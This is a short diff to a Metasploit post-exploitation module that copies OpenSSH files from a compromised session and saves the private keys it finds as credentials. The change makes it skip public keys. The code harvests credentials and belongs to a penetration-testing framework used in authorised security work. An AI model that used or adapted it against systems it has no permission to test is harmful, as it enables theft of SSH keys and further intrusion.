@@ -61,22 +61,25 @@ class MetasploitModule < Msf::Post
         loot_path = store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
         print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
 
-        begin
-          key = SSHKey.new(data, :passphrase => "")
+        # store only ssh private keys
+        unless SSHKey.valid_ssh_public_key? data
+          begin
+            key = SSHKey.new(data, :passphrase => "")
 
-          credential_data = {
-            origin_type: :session,
-            session_id: session_db_id,
-            post_reference_name: self.refname,
-            private_type: :ssh_key,
-            private_data: key.key_object.to_s,
-            username: user,
-            workspace_id: myworkspace_id
-          }
+            credential_data = {
+              origin_type: :session,
+              session_id: session_db_id,
+              post_reference_name: self.refname,
+              private_type: :ssh_key,
+              private_data: key.key_object.to_s,
+              username: user,
+              workspace_id: myworkspace_id
+            }
 
-          create_credential(credential_data)
-        rescue OpenSSL::OpenSSLError => e
-          print_error("Could not load SSH Key: #{e.message}")
+            create_credential(credential_data)
+          rescue OpenSSL::OpenSSLError => e
+            print_error("Could not load SSH Key: #{e.message}")
+          end
         end
 
       end
